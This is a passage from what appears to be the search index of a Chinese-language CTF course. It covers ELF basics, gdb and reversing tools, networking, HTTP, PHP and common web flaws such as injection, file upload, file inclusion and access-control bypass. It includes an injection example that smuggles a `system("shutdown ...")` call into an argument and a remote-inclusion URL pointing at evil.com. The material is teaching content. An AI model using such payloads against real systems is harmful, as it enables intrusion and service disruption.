\u00a0 printf(\"Before main\\n\");\n\n}\n\n\n__attribute__((destructor)) void func2() {\n\n\u00a0 \u00a0 printf(\"After main\\n\");\n\n}\n\n\nint main(void){\n\n\u00a0 \u00a0 printf(\"During main\\n\");\n\n}\n</code></pre> <p>\u5bf9\u4e8e\u6b64\u7a0b\u5e8f\uff0c\u8fd0\u884c\u7ed3\u679c\u662f\uff1a</p> <pre><code>Before main\nDuring main\nAfter main\n</code></pre> <ul> <li>ELF \u7a0b\u5e8f\u7684\u751f\u547d\u5468\u671f<ul> <li>\u5bf9\u4e8e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u5185\u6838\u4ee5\u53ef\u6267\u884c\u6587\u4ef6\u7684 e_entry \u4f4d\u7f6e(\u5373_start)\u4f5c\u4e3a\u8d77\u70b9</li> <li>\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u5185\u6838\u4ee5interpreter\u6587\u4ef6\u7684 e_entry \u4f4d\u7f6e\u4f5c\u4e3a\u8d77\u70b9<ul> <li>loader \u8d1f\u8d23\u89e3\u6790\u548c\u88c5\u8f7d\u5176\u5b83\u7b26\u53f7\uff0c\u8fdb\u800c\u518d\u8df3\u8f6c\u5230\u7ed9\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u7684_start</li> </ul> </li> </ul> </li> </ul> <p>\u8d77\u70b9\u53ef\u4ee5\u770b\u53ef\u6267\u884c\u6587\u4ef6\u7684Header</p>"},{"location":"Courses/ctf/Reverse/#elf_2","title":"ELF \u7684\u4ea4\u4e92\u3001\u8c03\u8bd5","text":"<ul> <li><code>gdb</code> \u8c03\u8bd5C\u8bed\u8a00\u7a0b\u5e8f<ul> <li><code>run</code> \u5f00\u59cb\u8fd0\u884c</li> <li><code>b *main</code> \u5728 main \u51fd\u6570\u5f00\u5934\u8bbe\u7f6e\u65ad\u70b9</li> <li><code>info break</code> \u67e5\u770b\u5f53\u524d\u65ad\u70b9\u60c5\u51b5</li> <li><code>p &amp;buffer[0]</code> \u67e5\u770b\u6570\u7ec4 <code>buffer</code> \u7684\u8d77\u59cb\u5730\u5740</li> <li><code>x/gx $rsp/rbp</code> \u67e5\u770b <code>rsp/rbp</code> \u6307\u9488\u6307\u5411\u7684\u5730\u5740</li> </ul> </li> </ul>"},{"location":"Courses/ctf/Reverse/#elf_3","title":"ELF \u7684\u9006\u5411","text":""},{"location":"Courses/ctf/Reverse/#_3","title":"\u9759\u6001\u9006\u5411","text":"<ul> <li>\u53cd\u6c47\u7f16\uff1a\u673a\u5668\u6307\u4ee4 \\(\\Rightarrow\\) \u6c47\u7f16\u6307\u4ee4(\u67e5\u8868\u3001\u51c6\u786e)<ul> <li>objdump -d hello.elf (| less) \u52a0\u4e0aless\u663e\u793a\u7684\u5c11\u4e00\u4e9b</li> </ul> </li> <li>\u53cd\u7f16\u8bd1\uff1a\u6c47\u7f16\u6307\u4ee4 \\(\\Rightarrow\\) \u7f16\u7a0b\u8bed\u8a00<ul> <li>IDA pro</li> <li>Binary Ninja</li> <li>Ghidra</li> <li>Cutter/radare</li> <li>\u5927\u8bed\u8a00\u6a21\u578b;D</li> </ul> </li> </ul> <p>\u5728\u57fa\u7840\u7684 CTF \u9898\u76ee\u4e0a\uff0c\u4e00\u822c\u628a\u53ef\u6267\u884c\u7a0b\u5e8f\u4e22\u8fdb IDA \u5c31\u53ef\u4ee5\u5f97\u5230\u6e90\u7801\u4e86</p>"},{"location":"Courses/ctf/Reverse/#_4","title":"\u52a8\u6001\u9006\u5411","text":"<p>\u53ef\u8fd0\u884c \u548c \u53ef\u8c03\u8bd5 \u662f\u9ad8\u6548\u89e3\u51b3</p>"},{"location":"Courses/ctf/Web/","title":"Web \u57fa\u7840","text":""},{"location":"Courses/ctf/Web/#web","title":"Web \u57fa\u7840","text":"<p> \u7ea6 3512 \u4e2a\u5b57  73 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 18 \u5206\u949f</p>"},{"location":"Courses/ctf/Web/#web-cs","title":"Web \u5e94\u7528\u67b6\u6784\uff1a\u5ba2\u6237\u7aef+\u670d\u52a1\u7aef (C/S)","text":"<p>C/S and B/S ?</p> <ul> <li>Client/Server\u5206\u4e3a\u4e24\u5c42\uff0c\u7b2c\u4e00\u5c42\u662f\u7528\u6237\u8868\u793a\u5c42\uff0c\u7b2c\u4e8c\u5c42\u662f\u6570\u636e\u5e93\u5c42\u3002\u9700\u8981\u7a0b\u5e8f\u5458\u81ea\u5df1\u5199\u5ba2\u6237\u7aef\u3002</li> <li>Browser/Server\u5206\u4e3a\u8868\u793a\u5c42\uff0c\u5e94\u7528\u5c42\uff0c\u6570\u636e\u5c42\u4e09\u5c42\uff0c\u53ea\u8981\u6709\u6d4f\u89c8\u5668\u5c31\u80fd\u6253\u5f00 </li> </ul> <p>\u684c\u9762\u5e94\u7528\u548cWeb\u5e94\u7528\u5728\u67b6\u6784\u4e0a\u6709\u663e\u8457\u7684\u533a\u522b\u3002\u684c\u9762\u5e94\u7528\u901a\u5e38\u662f\u5728\u672c\u5730\u8fd0\u884c\u7684\u72ec\u7acb\u7a0b\u5e8f\uff0c\u800cWeb\u5e94\u7528\u5219\u9700\u8981\u4f9d\u8d56\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u534f\u4f5c\u3002</p> <ul> <li>\u5ba2\u6237\u7aef\uff1a\u4f60\u7684\u6d4f\u89c8\u5668<ul> <li>\u53ef\u89c6\u5316\uff1a\u56fe\u5f62\u3001\u56fe\u7247\u3001\u5e03\u5c40\u2026\u2026 HTML + CSS</li> <li>\u4eba\u673a\u4ea4\u4e92\u903b\u8f91\uff1a\u6309\u94ae\u70b9\u51fb\uff0c\u767b\u5f55\uff0c\u53d1\u9001\u8bf7\u6c42\u2026\u2026JS</li> <li>\u7f13\u5b58\u3001Cookie</li> <li>\u5b89\u5168\uff1a\u4e0d\u80fd\u5c06\u79c1\u5bc6\u7684\u3001\u4e0d\u8be5\u83b7\u53d6\u7684\u4fe1\u606f\u4f20\u51fa\u53bb\uff08\u6bd4\u5982 Cookie\uff09\uff0c\u4e0d\u80fd\u4e3a\u6240\u6b32\u4e3a\uff08\u6bd4\u5982\u6ce8\u9500\u5176\u4ed6\u7f51\u7ad9\u7684\u8d26\u53f7\uff09</li> </ul> </li> <li>\u670d\u52a1\u7aef\uff1a\u67d0\u53f0\u6216\u5f88\u591a\u53f0\u670d\u52a1\u5668 (\u4efb\u4f55\u4e00\u53f0\u8ba1\u7b97\u673a\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u670d\u52a1\u5668)<ul> <li>\u8ba4\u8bc1\u4e0e\u9274\u6743\uff1a\u5982\u4f55\u8bc1\u660e\u4f60\u662f\u4f60<ul> <li>Authentication</li> <li>Authorization</li> </ul> </li> <li>\u5904\u7406\u8bf7\u6c42\uff1a\u7528\u6237\u9700\u8981\u505a\u4ec0\u4e48\uff1f\u5c06\u7ed3\u679c\u8fd4\u56de\u5ba2\u6237\u7aef</li> <li>\u670d\u52a1\u5668\u4e5f\u53ef\u4ee5\u6709\u4e0d\u540c\u5206\u5de5\uff1a\u524d\u7aef\u540e\u7aef\u3001\u6570\u636e\u5e93\u2026\u2026</li> <li>\u5b89\u5168\uff1a\u7528\u6237\u4e0d\u80fd\u83b7\u5f97\u4e0d\u8be5\u83b7\u53d6\u7684\u4fe1\u606f\uff08\u6bd4\u5982 flag\uff09\uff0c\u4e0d\u80fd\u4e3a\u6240\u6b32\u4e3a\uff08\u6bd4\u5982\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff09</li> </ul> </li> </ul> <p>DDoS</p> <p>\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff0c\u901a\u8fc7\u5927\u91cf\u7684\u65e0\u6548\u8bf7\u6c42\u5360\u7528\u670d\u52a1\u5668\u8d44\u6e90\uff0c\u4f7f\u5f97\u5408\u6cd5\u8bf7\u6c42\u65e0\u6cd5\u88ab\u5904\u7406</p>"},{"location":"Courses/ctf/Web/#_1","title":"\u7f51\u7edc\uff1a\u6570\u636e\u4ea4\u6362","text":"<ul> <li>\u6570\u636e\u5305\u7684\u4f20\u8f93\u4e0e\u8def\u7531<ul> <li>\u60f3\u8c61\u4e00\u4e0b\uff0c\u6570\u636e\u5305\u5c31\u50cf\u662f\u4e00\u5c01\u5c01\u4fe1\u4ef6\uff0c\u800c\u7f51\u7edc\u5219\u662f\u904d\u5e03\u5168\u7403\u7684\u90ae\u653f\u7cfb\u7edf\u3002\u5f53\u6211\u4eec\u5728\u7535\u8111\u4e0a\u70b9\u51fb\u53d1\u9001\u90ae\u4ef6\u65f6\uff0c\u6570\u636e\u88ab\u5207\u5272\u6210\u4e00\u4e2a\u4e2a\u5c0f\u5305\u88f9\uff0c\u5373\u6570\u636e\u5305\u3002\u8fd9\u4e9b\u6570\u636e\u5305\u968f\u540e\u88ab\u9001\u5f80\u6700\u8fd1\u7684\u90ae\u5c40\uff0c\u4e5f\u5c31\u662f\u8def\u7531\u5668\u3002\u8def\u7531\u5668\u5c31\u50cf\u90ae\u5c40\u7684\u5206\u62e3\u5458\uff0c\u6839\u636e\u5305\u88f9\u4e0a\u7684\u5730\u5740\uff08\u5373IP\u5730\u5740\uff09\uff0c\u51b3\u5b9a\u5c06\u5b83\u4eec\u9001\u5f80\u4e0b\u4e00\u4e2a\u90ae\u5c40\uff0c\u76f4\u81f3\u6700\u7ec8\u5230\u8fbe\u76ee\u7684\u5730\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u4f1a\u67e5\u770b\u6570\u636e\u5305\u7684\u76ee\u7684\u5730\uff0c\u5e76\u9009\u62e9\u6700\u4f73\u8def\u5f84\uff0c\u786e\u4fdd\u6570\u636e\u5305\u80fd\u591f\u5feb\u901f\u3001\u51c6\u786e\u5730\u5230\u8fbe\u3002</li> </ul> </li> <li>\u57df\u540d\u4e0eDNS\u7cfb\u7edf<ul> <li>\u5728\u7f51\u7edc\u7684\u4e16\u754c\u91cc\uff0cIP\u5730\u5740\u5c31\u50cf\u662f\u95e8\u724c\u53f7\u7801\uff0c\u867d\u7136\u7cbe\u786e\uff0c\u4f46\u8bb0\u5fc6\u8d77\u6765\u5374\u9887\u4e3a\u56f0\u96be\u3002\u8fd9\u65f6\uff0c\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u5c31\u5982\u540c\u4e00\u4e2a\u667a\u80fd\u7684\u7535\u8bdd\u7c3f\uff0c\u5c06\u590d\u6742\u7684IP\u5730\u5740\u8f6c\u5316\u4e3a\u6613\u4e8e\u8bb0\u5fc6\u7684\u57df\u540d\uff0c\u6bd4\u5982 <code>www.example.com</code> \u3002\u5f53\u4f60\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165\u4e00\u4e2a\u57df\u540d\u65f6\uff0cDNS\u670d\u52a1\u5668\u4f1a\u50cf\u67e5\u7535\u8bdd\u7c3f\u4e00\u6837\uff0c\u627e\u5230\u5bf9\u5e94\u7684IP\u5730\u5740\uff0c\u5e76\u6307\u5f15\u4f60\u7684\u8bf7\u6c42\u5230\u8fbe\u6b63\u786e\u7684\u670d\u52a1\u5668\u3002</li> <li>\u4e00\u4e2a\u57df\u540d\u4e0b\u9762\u53ef\u4ee5\u6709\u4efb\u610f\u591a\u6761DNS\u8bb0\u5f55\uff0c\u5982\u6620\u5c04\u5230IPv4\u7684A\u8bb0\u5f55\u3001\u6620\u5c04\u5230IPv6\u7684AAAA\u8bb0\u5f55\u3001CNAME(\u522b\u540d)\u3001TXT(\u6587\u672c\u4fe1\u606f)\u7b49</li> <li>\u8bbf\u95ee\u4e00\u4e2a\u57df\u540d\u7684\u65f6\u5019\uff0c\u8ba1\u7b97\u673a\u4f1a\u5411DNS\u670d\u52a1\u5668\u67e5\u8be2\u57df\u540d\u5bf9\u5e94\u7684DNS\u8bb0\u5f55<ul> <li>DNS\u00a0\u670d\u52a1\u5668\u6709\u53ef\u80fd\u7ee7\u7eed\u5411\u5176\u4ed6\u00a0DNS\u00a0\u670d\u52a1\u5668\u67e5\u8be2\uff0c\u76f4\u5230\u627e\u5230\u6240\u9700\u7684\u8bb0\u5f55</li> <li>\u4e00\u822c\u6765\u8bf4\uff0cDNS\u00a0\u670d\u52a1\u5668\u4f1a\u7f13\u5b58\u67e5\u8be2\u7ed3\u679c\uff0c\u4ee5\u51cf\u5c11\u67e5\u8be2\u65f6\u95f4\uff08TTL\uff09</li> <li>DNS\u00a0\u7684\u5206\u914d\u7aef\u53e3\u662f\u00a0TCP/UDP 53</li> </ul> </li> </ul> </li> <li>OSI\u6a21\u578b\u548cTCP/IP\u6a21\u578b<ul> <li>\u6b63\u5982\u6211\u4eec\u5199\u4ee3\u7801\u5c42\u5c42\u5c01\u88c5\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u603b\u4f53\u67b6\u6784\u4e5f\u662f\u5206\u5c42\u7684\u3002\u8fd9\u6837\u6bcf\u4e2a\u5c42\u5404\u53f8\u5176\u804c\uff0c\u4e0b\u5c42\u4e0a\u4e0a\u5c42\u7684\u57fa\u7840\u8bbe\u65bd\uff0c\u9010\u6e10\u6784\u5efa\u590d\u6742\u7684\u529f\u80fd\u3002</li> <li></li> </ul> </li> </ul>"},{"location":"Courses/ctf/Web/#tcpip","title":"TCP/IP \u534f\u8bae\u8be6\u89e3","text":"<ul> <li>IP: \u7f51\u7edc\u5c42=\u4e3b\u673a\u5230\u4e3b\u673a\uff0c\u6570\u636e\u5305\u5bfb\u5740\uff08\u5feb\u9012\u516c\u53f8\uff09<ul> <li>IPv1-3 \u4e3b\u8981\u7528\u4e8e\u5b9e\u9a8c\u7528\u9014\uff0c\u8bbe\u8ba1\u4e8e1973-1978\u5e74\u95f4</li> <li>IPv4\u7531\u56db\u4e2a\u6bb5\u7ec4\u6210\uff0c\u6bcf\u4e2a\u6bb5\u4e3a\u516b\u4f4d\u4e8c\u8fdb\u5236\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u6709 \\(2^{32}\\) \u4e2a\u4e0d\u540c\u5730\u5740(\u5b9e\u9645\u4e0a\u6709\u590d\u6742\u7684\u5730\u5740\u5206\u914d\u673a\u5236)</li> <li>2019\u00a0\u5e74\u00a011\u00a0\u6708\u00a025\u00a0\u65e5\uff0cRIPE NCC\u00a0\u5ba3\u5e03\u00a0IPv4\u00a0\u5730\u5740\u8017\u5c3d</li> </ul> </li> </ul> <p>IPv4 \u7684\u5730\u5740</p> <p></p> <ul> <li>TCP/UDP: \u4f20\u8f93\u5c42=\u5e94\u7528\u5230\u5e94\u7528\uff0c\u6216\u8005\u8bf4\u7aef\u5230\u7aef\uff08\u83dc\u9e1f\u9a7f\u7ad9\uff09 \u65e0\u8fb9\u754c\u7684\u5b57\u8282\u6d41\uff0c\u7c7b\u6bd4\u7535\u62a5\u62a5\u6587\uff0c\u7535\u62a5\u7684\u683c\u5f0f\u662f\u5e94\u7528\u5c42\u534f\u8bae\u8be5\u505a\u7684\uff0c\u7535\u62a5\u672c\u8eab\u53ea\u53d1\u5b57\u6bcd\u6570\u5b57<ul> <li>TCP: \u4f20\u8f93\u63a7\u5236\u534f\u8baeTransmission Control Protocol , \u9762\u5411\u8fde\u63a5\u7684\u534f\u8bae<ul> <li>\u901a\u8fc7\u590d\u6742\u7684\u63e1\u624b\u3001\u786e\u8ba4\u3001\u91cd\u4f20\u7b49\u673a\u5236\u4fdd\u8bc1\u6570\u636e\u7684\u987a\u5e8f\u548c\u53ef\u9760\u6027</li> <li>\u5177\u4f53\u800c\u8a00\u662f\u4e09\u6b21\u63e1\u624b\uff0c\u56db\u6b21\u6447\u624b</li> </ul> </li> <li>UDP: \u7528\u6237\u6570\u636e\u62a5\u534f\u8baeUser Datagram Protocol , \u65e0\u8fde\u63a5\uff1b\"send and forget\"<ul> <li>\u66f4\u7b80\u5355\u4e14\u5feb\u901f\uff1b\u5355\u5411\u4f20\u8f93\uff0c\u4e0d\u4fdd\u8bc1\u987a\u5e8f\uff0c\u4e0d\u4fdd\u8bc1\u53ef\u9760\u6027</li> </ul> </li> <li>\u7aef\u53e3\uff1a\u8f6f\u4ef6\u5c42\u9762\u7684\u901a\u4fe1\u7aef\u70b9\uff0c\u4e0e\u00a0IP\u00a0\u5730\u5740\u4e00\u8d77\u6784\u6210\u7f51\u7edc\u901a\u4fe1\u7684\u57fa\u7840<ul> <li>IP\u00a0\u5730\u5740\u8bc6\u522b\u673a\u5668\uff0c\u7aef\u53e3\u53f7\u8bc6\u522b\u8f6f\u4ef6\uff08\u670d\u52a1\uff09</li> <li>TCP\u00a0\u4e0e\u00a0UDP\u00a0\u7684\u7aef\u53e3\u53f7\u662f\u5206\u5f00\u7684\uff0c\u5373\u540c\u4e00\u4e2a\u7aef\u53e3\u53f7\u53ef\u4ee5\u540c\u65f6\u7528\u4e8e\u00a0TCP\u00a0\u548c\u00a0UDP</li> <li>\u7aef\u53e3\u53f7\u7684\u8303\u56f4\u662f0<sub>65535\uff0c\u5176\u4e2d0</sub>1023\u662f\u7cfb\u7edf\u4fdd\u7559\u7aef\u53e3\uff0c\u4e00\u822c\u4e0d\u7528\u4e8e\u901a\u4fe1\u670d\u52a1</li> </ul> </li> </ul> </li> </ul> \u5947\u602a\u7684\u6bd4\u55bb <p></p>"},{"location":"Courses/ctf/Web/#http","title":"HTTP \u534f\u8bae\u8be6\u89e3","text":"<p>\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae HyperText Transfer Protocol</p> <ul> <li>\u5c5e\u4e8e\u5e94\u7528\u5c42</li> <li>\u7279\u70b9\uff1a\u662f\u57fa\u4e8e\u6587\u672c\u7684\u534f\u8bae\uff0c\u7528\u4e8e\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u8f93\u7f51\u9875</li> <li>\u9700\u8981\u7ef4\u6301\u72b6\u6001\uff08\u6bd4\u5982\uff1a\u7528\u6237\u5df2\u767b\u5f55\uff09\u600e\u4e48\u529e\uff1fCookie \u5b58\u5728\u6587\u4ef6\u5934\u4e2d</li> <li>\u683c\u5f0f<ul> <li>http \u89c4\u5b9a\u4e86\u8bf7\u6c42\u62a5\u6587\u548c\u54cd\u5e94\u62a5\u6587\u7684\u5f62\u5f0f</li> <li>URL(\u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26)\u53ea\u80fd\u5305\u542bASCII\u5b57\u7b26\uff0cEncode\u4e3a\u767e\u5206\u53f7\u7f16\u7801</li> </ul> </li> </ul>"},{"location":"Courses/ctf/Web/#_2","title":"\u540e\u7aef\uff1a\u4e1a\u52a1\u903b\u8f91","text":"<p>\u540e\u7aef\u662fWeb\u5e94\u7528\u7684\u6838\u5fc3\uff0c\u5b83\u8d1f\u8d23\u5904\u7406\u4e1a\u52a1\u903b\u8f91\u3001\u6570\u636e\u5b58\u50a8\u548c\u5b89\u5168\u3002</p> <ul> <li>\u5e38\u89c1\u540e\u7aef\u6280\u672f\u6808\uff08\u5982Node.js\u3001PHP\u3001Python\u3001Ruby\u3001Go\u3001Rust \u7b49\uff09</li> <li>\u540e\u7aef\u5b89\u5168\uff1a\u6c38\u8fdc\u4e0d\u8981\u76f8\u4fe1\u7528\u6237\u7684\u6570\u636e\uff0c\u4e00\u5207\u524d\u7aef\u7684\u8fc7\u6ee4\u90fd\u7b49\u4e8e\u6ca1\u6709\u8fc7\u6ee4\uff01</li> <li>CTF: \u901a\u8fc7\u903b\u8f91\u6f0f\u6d1e\u7b49\u6b3a\u9a97\u540e\u7aef<ul> <li>\u6ce8\u5165\uff1a\u6df7\u6dc6\u4e86\u6570\u636e\u548c\u4ee3\u7801\u3002<ul> <li>\u4f8b\u5982 <code>printf(\"%d\", _____)</code></li> <li>\u6b63\u5e38\u8f93\u5165\uff1a<code>1</code> <code>2</code> <code>3</code></li> <li>\u6076\u610f\u8f93\u5165\uff1a<code>1); system(\"shutdown -s -t 0\"); //</code></li> <li>\u5c31\u53d8\u6210\u4e86 <code>printf(\"%d\", 1); system(\"shutdown -s -t 0\"); //)</code></li> </ul> </li> </ul> </li> </ul>"},{"location":"Courses/ctf/Web/#php","title":"PHP","text":"<p>PHP\u662f\u6700\u65e9\u7684Web\u5f00\u53d1\u8bed\u8a00\u4e4b\u4e00\uff0c\u5b83\u5728Web\u5f00\u53d1\u5386\u53f2\u4e0a\u5360\u6709\u91cd\u8981\u5730\u4f4d\u3002</p> <p>\u8bf7\u81ea\u5b66</p> <p>Example</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;PHP \u793a\u4f8b&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;\u6b22\u8fce\u4f7f\u7528 PHP&lt;/h1&gt;\n    &lt;?php\n    // \u5b9a\u4e49\u53d8\u91cf\n    $name = \"John\";\n    $age = 25;\n\n    // \u8f93\u51fa\u53d8\u91cf\n    echo \"&lt;p&gt;\u4f60\u597d\uff0c\u6211\u7684\u540d\u5b57\u662f $name\uff0c\u6211\u4eca\u5e74 $age \u5c81\u3002&lt;/p&gt;\";\n\n    // \u6761\u4ef6\u8bed\u53e5\n    if ($age &gt;= 18) {\n        echo \"&lt;p&gt;\u6211\u5df2\u6210\u5e74\u3002&lt;/p&gt;\";\n    } else {\n        echo \"&lt;p&gt;\u6211\u672a\u6210\u5e74\u3002&lt;/p&gt;\";\n    }\n\n    // \u6570\u7ec4\n    $fruits = array(\"apple\", \"banana\", \"cherry\");\n    echo \"&lt;p&gt;\u6211\u559c\u6b22\u7684\u6c34\u679c\u6709\uff1a&lt;/p&gt;\";\n    echo \"&lt;ul&gt;\";\n    foreach ($fruits as $fruit) {\n        echo \"&lt;li&gt;$fruit&lt;/li&gt;\";\n    }\n    echo \"&lt;/ul&gt;\";\n\n    // HTML \u77ed\u6807\u7b7e\n    ?&gt;\n    &lt;p&gt;\u8fd9\u662f\u4f7f\u7528 HTML \u77ed\u6807\u7b7e\u7684\u793a\u4f8b\uff1a&lt;/p&gt;\n    &lt;?= \"\u5f53\u524d\u65f6\u95f4\u662f\uff1a\" . date(\"Y-m-d H:i:s\") ?&gt;\n\n    &lt;?php\n    $fr = \"pear\";\n    $pear = 114;\n    $lingo = 514;\n    echo $$fr;\n    ?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u901a\u8fc7\u56fd\u5185\u5f00\u6e90\u8f6f\u4ef6 phpstudy \u642d\u5efa\u8fd9\u4e2a\u9875\u9762\u5427\uff01</p>"},{"location":"Courses/ctf/Web/#sql","title":"SQL","text":"<p>\u5165\u95e8\u53ef\u4ee5\u4ece MySQL \u5f00\u59cb\uff0c\u5404\u79cdSQL\u8bed\u6cd5\u5927\u5dee\u4e0d\u5dee\u3002</p> <p>\u8bf7\u81ea\u5b66</p>"},{"location":"Courses/ctf/Web/#_3","title":"\u540e\u7aef\u76f8\u5173\u5b89\u5168\u8bdd\u9898","text":"<ul> <li>Cookie \u4e0e Session<ul> <li>Cookie\uff1a\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7684\u5c0f\u578b\u6587\u672c\u6587\u4ef6\uff0c\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u7684\u504f\u597d\u8bbe\u7f6e\u3001\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f\u7b49\u3002<ul> <li>\u793a\u4f8b\uff1a\u7528\u6237\u767b\u5f55\u540e\uff0c\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a\u5305\u542b\u7528\u6237ID\u7684Cookie\u5230\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u5728\u540e\u7eed\u8bf7\u6c42\u4e2d\u81ea\u52a8\u5305\u542b\u8be5Cookie\uff0c\u4ee5\u4fbf\u670d\u52a1\u5668\u8bc6\u522b\u7528\u6237\u3002</li> <li>Cookie\u52ab\u6301\uff1a\u653b\u51fb\u8005\u901a\u8fc7XSS\u653b\u51fb\u6216\u5176\u4ed6\u624b\u6bb5\u83b7\u53d6\u7528\u6237\u7684Cookie\uff0c\u4ece\u800c\u5192\u5145\u7528\u6237\u8eab\u4efd\u3002</li> </ul> </li> <li>Session\uff1a\u5b58\u50a8\u5728\u670d\u52a1\u5668\u7aef\u7684\u4e34\u65f6\u6570\u636e\u5b58\u50a8\u533a\u57df\uff0c\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u7684\u4f1a\u8bdd\u72b6\u6001\u4fe1\u606f\u3002<ul> <li>\u793a\u4f8b\uff1a\u7528\u6237\u767b\u5f55\u540e\uff0c\u670d\u52a1\u5668\u521b\u5efa\u4e00\u4e2aSession\uff0c\u5e76\u5c06Session ID\u901a\u8fc7Cookie\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u5ba2\u6237\u7aef\u5728\u540e\u7eed\u8bf7\u6c42\u4e2d\u5305\u542b\u8be5Session ID\uff0c\u670d\u52a1\u5668\u6839\u636eSession ID\u67e5\u627e\u5bf9\u5e94\u7684Session\u6570\u636e\u3002</li> <li>\u5982\u679c\u670d\u52a1\u5668\u88ab\u653b\u7834\uff0cSession\u4e2d\u5c31\u53ef\u80fd\u6709\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\u3002</li> </ul> </li> </ul> </li> <li>\u903b\u8f91\u6f0f\u6d1e\uff1a\u9a8c\u8bc1\u4e0d\u5145\u5206\u3001\u60f3\u5f53\u7136\u7684\u5199\u6cd5\u3001\u6761\u4ef6\u7ade\u4e89\u3001\u672a\u53d1\u73b0\u7684\u65c1\u95e8\u5de6\u9053\u2026\u2026<ul> <li>\u7a0b\u5e8f\u5458\u7684\u50b2\u6162\u53ef\u80fd\u4f1a\u8ba9\u4ed6\u8ba4\u4e3a<code>a==1&amp;&amp;a==2</code> \u4e00\u5b9a\u662f false \u4f46\u2026\u2026</li> <li></li> </ul> </li> <li>\u4efb\u610f\u6587\u4ef6\u8bfb\u4e0e\u4efb\u610f\u4ee3\u7801\u6267\u884c<ul> <li>\u4f8b\u5982\u4e00\u4e2aWeb\u5e94\u7528\u5141\u8bb8\u7528\u6237\u4e0a\u4f20\u5934\u50cf\uff0c\u4f46\u672a\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u4e25\u683c\u7684\u7c7b\u578b\u548c\u5185\u5bb9\u68c0\u67e5\u3002\u653b\u51fb\u8005\u4e0a\u4f20\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u6267\u884c\u8be5\u4ee3\u7801\uff0c\u4ece\u800c\u63a7\u5236\u670d\u52a1\u5668\u3002</li> <li>CTF\u7ade\u8d5b\u4e2d\uff0c\u80fd\u8bfb\u670d\u52a1\u5668\u4e0a <code>/flag</code> \u5219\u8bfb\uff0c\u5426\u5219\u5c31\u6697\u793a\u6211\u4eec\u9700\u8981 RCE (\u4e0d\u7136\u8fde flag \u5728\u54ea\u4e2a\u6587\u4ef6\u90fd\u4e0d\u77e5\u9053).</li> </ul> </li> <li>\u6587\u4ef6\u5305\u542b\uff1a\u4f8b\u5982\u4e00\u4e2aWeb\u5e94\u7528\u5141\u8bb8\u7528\u6237\u901a\u8fc7URL\u53c2\u6570\u6307\u5b9a\u8981\u5305\u542b\u7684\u6587\u4ef6\uff0c\u5982<code>index.php?page=about</code>\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610fURL\uff0c\u5982<code>index.php?page=http://evil.com/malicious.php</code>\uff0c\u5305\u542b\u8fdc\u7a0b\u6076\u610f\u6587\u4ef6\uff0c\u4ece\u800c\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002</li> <li>\u8d8a\u6743\uff1a\u4f8b\u5982\u4e00\u4e2aWeb\u5e94\u7528\u5141\u8bb8\u7528\u6237\u67e5\u770b\u81ea\u5df1\u7684\u8ba2\u5355\u4fe1\u606f\uff0c\u4f46\u672a\u6b63\u786e\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7be1\u6539URL\u53c2\u6570\uff0c\u5982<code>order.php?id=123</code>\uff0c\u67e5\u770b\u5176\u4ed6\u7528\u6237\u7684\u8ba2\u5355\u4fe1\u606f\u3002<ul> <li>\u6c38\u8fdc\u4e0d\u8981\u76f8\u4fe1\u7528\u6237\u7684\u6570\u636e\uff01\u524d\u7aef\u4ee3\u7801\u4e5f\u8bb8\u6c38\u8fdc\u4e0d\u4f1a\u8bbf\u95ee\u5176\u4ed6\u7528\u6237\u7684\u6570\u636e\uff0c\u4f46\u8fd9\u4e0d\u4ee3\u8868\u6076\u610f\u653b\u51fb\u8005\u5c31\u4e0d\u4f1a\u3002</li> </ul> </li> 